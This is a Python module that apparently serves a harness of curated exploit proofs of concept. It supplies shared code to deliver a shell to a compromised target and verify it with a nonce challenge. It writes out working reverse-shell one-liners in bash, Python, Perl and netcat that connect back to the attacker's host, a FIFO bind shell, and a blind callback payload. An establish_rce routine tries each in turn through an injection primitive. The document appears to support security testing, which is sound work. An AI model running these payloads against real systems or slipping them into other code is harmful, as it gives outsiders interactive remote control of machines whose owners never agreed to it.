"""Generalized breach-delivery primitive for HALO curated PoCs.

Target-agnostic shell delivery + challenge-response (nonce) proof, shared by every
PoC under pocs/. Stdlib-socket only — runs unchanged in python:3.12-slim.

Trust model: the MODEL is untrusted, the PoC CODE is trusted (we wrote+tested it), the
TARGET is untrusted. Proof is execution-derived, not literal-echo: the shell must return
a value it can only produce by RUNNING our command (the substituted `$(id -u)` marker, or
a computed `a+b` on the blind rung). A tarpit streaming `uid=0(root)`, or a reflector that
echoes our bytes verbatim, returns the literal recipe and is rejected.

Residual limit: this proves a shell RAN our command, which reflection cannot forge. It
does NOT defeat a genuine command-forwarding relay — a target that actually forwards our
command to a real shell elsewhere and runs it. There, our code did execute, just not
necessarily on the named host; evidence_meta's peer address is the only mitigating signal,
not a guarantee.
"""
from __future__ import annotations

import hashlib
import os
import random
import re
import socket
import time
from dataclasses import dataclass

_EVIDENCE_PREFIX = "HALO-EVIDENCE"


def make_nonce() -> str:
    """A fresh unpredictable hex token. os.urandom so a target can't guess it."""
    return os.urandom(12).hex()


def _rand_operand() -> int:
    """A per-attempt integer the target must ADD — forcing computation, not echo."""
    return random.randint(1000, 9_999_999)


def payload_fingerprint(payload: str) -> str:
    """Short stable hash of a payload, for binding a challenge to what we sent."""
    return hashlib.sha256(payload.encode()).hexdigest()[:16]


@dataclass(frozen=True)
class Challenge:
    """A per-attempt proof challenge. `nonce` gives freshness; `a`,`b` force the target
    to COMPUTE (sum) rather than echo; the binding fields tie the answer to THIS attempt,
    target, payload and channel; `expiry` is a time.monotonic() deadline (0 => none)."""
    nonce: str
    a: int
    b: int
    target: str = ""
    attempt_id: str = ""
    payload_hash: str = ""
    expected_channel: str = ""
    expiry: float = 0.0

    @property
    def expected_sum(self) -> int:
        return self.a + self.b

    def expired(self, _now: float | None = None) -> bool:
        if not self.expiry:
            return False
        now = time.monotonic() if _now is None else _now
        return now > self.expiry

    def matches(self, *, target: str | None = None, channel: str | None = None) -> bool:
        if target is not None and self.target and target != self.target:
            return False
        if channel is not None and self.expected_channel and channel != self.expected_channel:
            return False
        return True

    @classmethod
    def ephemeral(cls, nonce: str) -> "Challenge":
        """Unbound single-use challenge for callers still passing a bare nonce string."""
        return cls(nonce=nonce, a=_rand_operand(), b=_rand_operand())


def mint_challenge(target: str = "", *, attempt_id: str = "", payload_hash: str = "",
                   channel: str = "", ttl: float = 30.0) -> Challenge:
    return Challenge(
        nonce=make_nonce(), a=_rand_operand(), b=_rand_operand(),
        target=target, attempt_id=attempt_id, payload_hash=payload_hash,
        expected_channel=channel,
        expiry=(time.monotonic() + ttl) if ttl else 0.0,
    )


class ChallengeRegistry:
    """Process-local mint + consume-once. Rejects replayed and cross-attempt answers."""

    def __init__(self) -> None:
        self._consumed: set[str] = set()

    def mint(self, target: str = "", **kw) -> Challenge:
        return mint_challenge(target, **kw)

    def consume(self, ch: Challenge) -> bool:
        if ch.nonce in self._consumed:
            return False
        self._consumed.add(ch.nonce)
        return True

    def validate(self, ch: Challenge, *, target: str | None = None,
                 channel: str | None = None) -> bool:
        return (not ch.expired()
                and ch.matches(target=target, channel=channel)
                and ch.nonce not in self._consumed)


def _sha256(b: bytes) -> str:
    return hashlib.sha256(b).hexdigest()


@dataclass(frozen=True)
class Breach:
    confirmed: bool
    level: str                 # legacy alias: "shell" | "blind-rce" | "none"
    nonce: str
    proof: str
    uid: str | None = None
    host: str | None = None
    exit_code: str | None = None
    evidence: str = "none"     # layered: "code-exec" | "uid-verified" | "interactive" | "none"
    user: str | None = None
    evidence_hash: str | None = None
    evidence_meta: dict | None = None

    def __bool__(self) -> bool:
        return self.confirmed

    def __str__(self) -> str:
        parts = [_EVIDENCE_PREFIX, f"nonce={self.nonce}", f"level={self.level}",
                 f"evidence={self.evidence}"]
        if self.uid is not None:
            parts.append(f"uid={self.uid}")
        if self.user is not None:
            parts.append(f"user={self.user}")
        if self.host is not None:
            parts.append(f"host={self.host}")
        if self.exit_code is not None:
            parts.append(f"exit={self.exit_code}")
        head = " ".join(parts)
        return f"{head}\n{self.proof}" if self.proof else head


def local_ip_for(target: str, _sock_factory=socket.socket) -> str:
    """the host's source IP toward `target` — the LHOST for a reverse shell.

    Works because the ATTACK sandbox is --network=host, so getsockname() sees the host's
    real interface (no packet is sent for a UDP connect())."""
    s = _sock_factory(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect((target, 9))
        return s.getsockname()[0]
    finally:
        s.close()


_UID_RE = re.compile(r"uid=(\d+)\(")


_SAFE_TOKEN_RE = re.compile(r"\A[0-9A-Za-z._-]+\Z")


def _require_safe(name: str, value: str) -> str:
    """Reject any token that could break out of the shell command it is embedded in.
    nonce/lhost are interpolated into sh -c payloads unquoted; a metacharacter here
    would be command injection on the target, so fail closed."""
    if not _SAFE_TOKEN_RE.match(str(value)):
        raise ValueError(f"unsafe {name} for payload: {value!r}")
    return str(value)


def _drain(sock: socket.socket, timeout: float) -> bytes:
    sock.settimeout(timeout)
    chunks = []
    try:
        while True:
            data = sock.recv(4096)
            if not data:
                break
            chunks.append(data)
    except OSError:
        pass
    return b"".join(chunks)


def _proof_probe(nonce: str) -> bytes:
    """Ask the shell to COMPUTE `$(id -u)`/`$(id -un)` around the nonce. A reflector
    returns the literal `$( ... )` recipe and cannot satisfy the substituted marker."""
    return f"echo {nonce}.$(id -u).$(id -un); uname -n\n".encode()


def _marker_re(nonce: str):
    return re.compile(re.escape(nonce) + r"\.(?P<uid>\d+)\.(?P<user>[A-Za-z0-9._-]+)")


def confirm_shell(sock: socket.socket, *, service: str = "", nonce: str = "",
                  challenge=None, timeout: float = 8.0) -> Breach:
    """Probe an already-open shell socket with an execution-derived challenge.

    Confirmed only when the target returns the SUBSTITUTED marker `<nonce>.<uid>.<user>`
    — proving a shell ran our command. A banner/tarpit/reflector that echoes our bytes
    returns the literal `$(id -u)` recipe and is rejected."""
    ch = challenge if isinstance(challenge, Challenge) else Challenge.ephemeral(nonce or make_nonce())
    nonce = ch.nonce
    try:
        peer = sock.getpeername()[0]
    except (OSError, IndexError):
        peer = None
    try:
        sock.sendall(_proof_probe(nonce))
        out = _drain(sock, timeout)
    except OSError:
        out = b""
    finally:
        try:
            sock.close()
        except OSError:
            pass
    text = out.decode("utf-8", "replace")
    meta = {"peer": peer, "ts": time.time(), "channel": "interactive"}
    ehash = _sha256(out)
    # Reflection guard: the literal recipe means nothing executed.
    if f"{nonce}.$(" in text:
        return Breach(confirmed=False, level="none", evidence="none", nonce=nonce,
                      proof=text, evidence_hash=ehash, evidence_meta=meta)
    m = _marker_re(nonce).search(text)
    # Require the marker to be line-terminated: a truncated read (cut mid-user, no
    # trailing newline) is NOT a complete, executed marker and must be rejected.
    if not m or not text[m.end():m.end() + 1].isspace():
        return Breach(confirmed=False, level="none", evidence="none", nonce=nonce,
                      proof=text, evidence_hash=ehash, evidence_meta=meta)
    uid, user = m.group("uid"), m.group("user")
    host = None
    for line in text.splitlines():
        s = line.strip()
        if s and not _marker_re(nonce).search(s):
            host = s
            break
    return Breach(confirmed=True, level="shell", evidence="interactive", nonce=nonce,
                  proof=text.strip(), uid=uid, user=user, host=host, exit_code="0",
                  evidence_hash=ehash, evidence_meta=meta)


def _first_available(*variants: str) -> str:
    """Chain shell variants so the first present interpreter wins."""
    guarded = []
    for bin_name, cmd in variants:
        guarded.append(f"command -v {bin_name} >/dev/null 2>&1 && {{ {cmd}; }}")
    return " || ".join(guarded)


def reverse_payload(lhost: str, lport: int, nonce: str) -> str:
    """Announce the nonce, then hand /bin/sh back over the reverse connection."""
    _require_safe("lhost", lhost)
    _require_safe("nonce", nonce)
    lport = int(lport)
    bash = (f"bash -c 'exec 3<>/dev/tcp/{lhost}/{lport}; echo {nonce}-MARK >&3; "
            f"sh -i >&3 2>&3 <&3'")
    py = (f"python3 -c 'import socket,subprocess,os;"
          f"s=socket.socket();s.connect((\"{lhost}\",{lport}));"
          f"s.sendall(b\"{nonce}-MARK\\n\");"
          f"[os.dup2(s.fileno(),f) for f in (0,1,2)];"
          f"subprocess.call([\"/bin/sh\",\"-i\"])'")
    perl = (f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};"
            f"socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
            f"connect(S,sockaddr_in($p,inet_aton($i)));"
            f"send(S,\"{nonce}-MARK\\n\",0);"
            f"open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'")
    nc = (f"(echo {nonce}-MARK; /bin/sh -i) 2>&1 | nc {lhost} {lport}")
    return _first_available(("bash", bash), ("python3", py), ("perl", perl), ("nc", nc))


def bind_payload(bind_port: int, nonce: str) -> str:
    """Spawn /bin/sh bound to bind_port; connect+confirm_shell proves it (nonce sent on probe)."""
    _require_safe("nonce", nonce)
    bind_port = int(bind_port)
    fifo = "/tmp/.hb"
    return (f"rm -f {fifo}; mkfifo {fifo}; "
            f"cat {fifo} | /bin/sh -i 2>&1 | nc -l -p {bind_port} > {fifo} &")


def blind_callback_payload(lhost: str, lport: int, challenge) -> str:
    """Connect back and send `<nonce>:<a+b>` — the target must COMPUTE the sum, so a
    reflector echoing the payload (literal `$(( a + b ))`) cannot forge the answer."""
    ch = challenge if isinstance(challenge, Challenge) else Challenge.ephemeral(str(challenge))
    _require_safe("lhost", lhost)
    _require_safe("nonce", ch.nonce)
    lport = int(lport)
    a, b = ch.a, ch.b
    ans = f"{ch.nonce}:$(( {a} + {b} ))"                 # sh/bash/nc compute this
    bash = f"bash -c 'exec 3<>/dev/tcp/{lhost}/{lport}; echo {ans} >&3'"
    py = (f"python3 -c 'import socket;s=socket.socket();"
          f"s.connect((\"{lhost}\",{lport}));s.sendall(b\"{ch.nonce}:%d\"%({a}+{b}))'")
    perl = (f"perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
            f"connect(S,sockaddr_in({lport},inet_aton(\"{lhost}\")));"
            f"$s={a}+{b};send(S,\"{ch.nonce}:$s\",0);'")
    nc = f"echo {ans} | nc {lhost} {lport}"
    return _first_available(("bash", bash), ("python3", py), ("perl", perl), ("nc", nc))


class _Listener:
    """Ephemeral TCP listener bound on the host (reachable via --network=host)."""

    def __init__(self, bind_ip: str = "0.0.0.0", timeout: float = 10.0):
        self._bind_ip = bind_ip
        self._timeout = timeout
        self._srv: socket.socket | None = None
        self.port = 0

    def __enter__(self) -> "_Listener":
        self._srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._srv.bind((self._bind_ip, 0))     # 0 → OS picks an ephemeral high port
        self._srv.listen(1)
        self._srv.settimeout(self._timeout)
        self.port = self._srv.getsockname()[1]
        return self

    def __exit__(self, *exc) -> None:
        if self._srv is not None:
            try:
                self._srv.close()
            finally:
                self._srv = None

    def accept_one(self) -> socket.socket | None:
        try:
            conn, _ = self._srv.accept()
            return conn
        except OSError:
            return None

    def wait_for_answer(self, challenge) -> bool:
        ch = challenge if isinstance(challenge, Challenge) else Challenge.ephemeral(str(challenge))
        conn = self.accept_one()
        if conn is None:
            return False
        try:
            data = _drain(conn, self._timeout)
        finally:
            conn.close()
        self.last_raw = data
        return f"{ch.nonce}:{ch.expected_sum}".encode() in data


def establish_rce(inject, target: str, *, service: str = "", nonce: str = "",
                  challenge=None, bind_port: int = 45444, ladder_timeout: float = 8.0,
                  _ip: str | None = None) -> Breach:
    """Given a blind single-command `inject`, walk the delivery ladder until a breach.

    Rung 1 reverse shell → Rung 2 bind shell → Rung 3 blind arithmetic callback. Each
    rung proves execution (substitution or computed sum), not reflection. Returns the
    first confirmed Breach; never raises for a non-breach.

    LIMIT: a genuine command-forwarding relay would pass — our code ran, just perhaps not
    on the named host. That is out of scope; `evidence_meta['peer']` is the only signal."""
    ch = challenge if isinstance(challenge, Challenge) else Challenge.ephemeral(nonce or make_nonce())
    nonce = ch.nonce
    lhost = _ip or local_ip_for(target)

    # Rung 1: reverse shell — accept the callback, then prove with a substitution probe.
    with _Listener(timeout=ladder_timeout) as lis:
        try:
            inject(reverse_payload(lhost, lis.port, nonce))
        except Exception:
            pass
        conn = lis.accept_one()
        if conn is not None:
            br = confirm_shell(conn, service=service, challenge=ch, timeout=ladder_timeout)
            if br:
                return br

    # Rung 2: bind shell — connect out and prove with the same substitution probe.
    try:
        inject(bind_payload(bind_port, nonce))
    except Exception:
        pass
    deadline = time.time() + ladder_timeout
    while time.time() < deadline:
        try:
            sock = socket.create_connection((target, bind_port), timeout=ladder_timeout)
        except OSError:
            time.sleep(0.4)
            continue
        br = confirm_shell(sock, service=service, challenge=ch, timeout=ladder_timeout)
        if br:
            return br
        break

    # Rung 3: blind arithmetic callback — prove exec even with no usable shell.
    with _Listener(timeout=ladder_timeout) as lis:
        try:
            inject(blind_callback_payload(lhost, lis.port, ch))
        except Exception:
            pass
        if lis.wait_for_answer(ch):
            return Breach(confirmed=True, level="blind-rce", evidence="code-exec",
                          nonce=nonce,
                          proof=f"{nonce}:{ch.expected_sum} computed and received out-of-band",
                          evidence_hash=_sha256(getattr(lis, "last_raw", b"")),
                          evidence_meta={"channel": "blind-callback", "ts": time.time()},
                          exit_code="0")

    return Breach(confirmed=False, level="none", evidence="none", nonce=nonce, proof="")
